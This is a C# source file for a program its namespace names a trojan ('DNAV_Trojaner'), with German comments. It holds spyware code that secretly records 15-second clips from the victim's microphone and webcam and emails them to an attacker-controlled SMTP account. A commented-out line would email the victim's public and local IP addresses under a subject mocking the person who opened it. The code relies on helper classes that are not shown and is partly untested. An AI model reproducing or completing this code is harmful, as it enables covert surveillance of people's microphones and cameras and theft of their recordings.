using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading;
namespace DNAV_Trojaner {
    class Program {
        static public void Tonaufnahme() {
             //! Daten richtig angeben
            Mailer m = new Mailer("ToMail@mail.de","FromMail@mail.de","FromMail@mail.de","Supergeheim",587,"mail.mail.de");
            int sec = 15;
            Audio.SetPath("TestAudio");
            Audio.Start(sec, (path) => {
                m.send("Neue Audiodatei", "Eine neue Datei verfügbar:", path);
            });
        }

         static public void Camaufnahme() {
             //! Daten richtig angeben
            Mailer m = new Mailer("ToMail@mail.de","FromMail@mail.de","FromMail@mail.de","Supergeheim",587,"mail.mail.de");
            int sec = 15;
            Cam.SetPath("TestVideo");
            Cam.Start(sec, (path) => { 
                m.send("Neue Videodatei", "Eine neue Datei verfügbar:", path); 
            });
        }

        static public void SendIP() {
            //! Daten richtig angeben
            Mailer m = new Mailer("ToMail@mail.de","FromMail@mail.de","FromMail@mail.de","Supergeheim",587,"mail.mail.de");
            //m.send("Trottel hat DNAV geöffnet", "Public: " + TCP.getPublicIP() + "\nLocal: " + TCP.getLocalIP());
            Console.Write(TCP.getLocalIPList());
            Console.Read();
        }

        static void Main(string[] args) {
            //Camaufnahme();
            //!Fehler beim Loop!!

            //? Konnte noch nicht getestet werden - könnte aber klappen
            // Cam.Start();
            // System.Threading.Thread.Sleep(10000);
            // Cam.Stop();
            SendIP();
        }
    }
}
